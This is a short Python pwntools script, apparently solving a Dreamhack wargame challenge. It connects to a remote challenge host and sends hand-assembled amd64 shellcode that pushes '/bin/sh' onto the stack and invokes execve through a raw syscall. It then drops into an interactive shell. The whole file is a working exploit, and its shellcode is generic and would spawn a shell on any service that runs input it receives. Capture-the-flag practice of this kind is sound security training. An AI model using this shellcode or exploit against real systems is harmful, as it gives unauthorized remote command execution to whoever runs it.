from pwn import *

port = 12739
rem = remote("host3.dreamhack.games", port)

context.arch = 'amd64'

binsh_str = u64(b'/bin/sh\x00')

shell = f"""    
    add rax, {(binsh_str >> 32) & 0xFFFFFFFF}
    shl rax, 32
    add rax, {binsh_str & 0xFFFFFFFF}
    push rax
    xor rdi, rdi
    add rdi, rsp
    
    xor rsi, rsi
    xor rdx, rdx
    
    /* call execve() */
    xor rax, rax
    add rax, 0x3b
    syscall
    
"""

rem.sendafter(b'> ', asm(shell))

rem.interactive()